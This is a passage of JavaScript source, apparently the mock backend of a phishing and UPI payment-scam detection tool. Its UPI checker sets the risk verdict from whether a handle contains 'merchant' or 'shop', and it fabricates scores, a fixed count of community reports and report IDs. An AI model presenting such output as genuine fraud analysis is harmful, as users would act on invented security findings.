  const [handle, bank] = vpa.split('@');
  const suspect = !vpa.includes('merchant') && !vpa.includes('shop');
  const score = suspect ? rng.int(64, 92) : rng.int(6, 24);

  return {
    target: vpa,
    generatedAt: new Date().toISOString(),
    vpa,
    payee: {
      name: suspect ? 'Cashback Rewards India' : handle.replace(/[._]/g, ' ').replace(/\b\w/g, (c) => c.toUpperCase()),
      handle,
      bank: bank.toUpperCase(),
      type: suspect ? 'Individual' : 'Merchant',
      verified: !suspect,
      accountAgeDays: suspect ? rng.int(2, 20) : rng.int(200, 2400),
    },
    merchant: suspect
      ? { registered: false, gstin: null, category: 'Unregistered', website: null }
      : { registered: true, gstin: '27AABCA1234F1Z5', category: 'Retail', website: 'https://acmestore.example' },
    amount: suspect ? '₹1,999' : '₹499',
    note: suspect ? 'Claim cashback — limited offer' : 'Order #AC-2841',
    score,
    verdict: suspect ? 'high-risk' : 'low-risk',
    summary: suspect
      ? 'This handle has 14 community reports in the last 30 days, uses an individual account for a cashback promise, and the QR encodes a fixed amount with no merchant identity.'
      : 'The handle belongs to a registered merchant with a consistent trading history and no community reports.',
    checks: [
      { label: 'Handle format', status: 'pass', detail: 'Syntactically valid UPI VPA' },
      { label: 'Merchant verification', status: suspect ? 'fail' : 'pass', detail: suspect ? 'No merchant registration found' : 'Registered merchant account with GSTIN' },
      { label: 'Scam report history', status: suspect ? 'fail' : 'pass', detail: suspect ? '14 reports in 30 days' : '0 reports in 12 months' },
      { label: 'Collect request signature', status: suspect ? 'warn' : 'pass', detail: suspect ? 'Amount is fixed and locked in the QR payload' : 'Standard signed collect request' },
      { label: 'Beneficiary name match', status: suspect ? 'warn' : 'pass', detail: suspect ? 'Display name differs from verified account name' : 'Name matches merchant record' },
    ],
    reports: suspect
      ? [
          { id: 'RPT-8841', category: 'Cashback scam', date: ago(2), status: 'confirmed' },
          { id: 'RPT-8712', category: 'Fake UPI collect', date: ago(6), status: 'confirmed' },
          { id: 'RPT-8604', category: 'Payment fraud', date: ago(11), status: 'under review' },
        ]
      : [],
    qr: { detected: true, format: 'UPI QR (EMVCo)', payloadSize: rng.int(120, 340), amountLocked: suspect },
    indicators: suspect
      ? ['Unregistered merchant', 'Fixed amount QR', 'Recent scam reports', 'Individual account for business collection']
      : ['Verified merchant', 'Consistent transaction history'],
  };
}

const BUILDERS = {
  'certificate-transparency': certificateTransparency,
  'ca-reputation': caReputation,
  'certificate-anomalies': certificateAnomalies,
  'visual-similarity': visualSimilarity,
  typosquatting,
  'security-configuration': securityConfiguration,
  'redirect-chain': redirectChain,
  cloaking,
  'phishing-kits': phishingKits,
  'favicon-logo-hash': faviconLogoHash,
  'javascript-behaviour': javascriptBehaviour,
  'hosting-fingerprint': hostingFingerprint,
  'upi-qr': upiQr,
};

export function runDetection(slug, target) {
  const builder = BUILDERS[slug];
  if (!builder) return null;
  const rng = createRng(`${slug}:${target.toLowerCase()}`);
  return { ...builder(target, rng), tool: slug };
}

export function daysUntil(date) {
  return -daysBetween(date, new Date(Date.now() + 86400000 * 0));
}
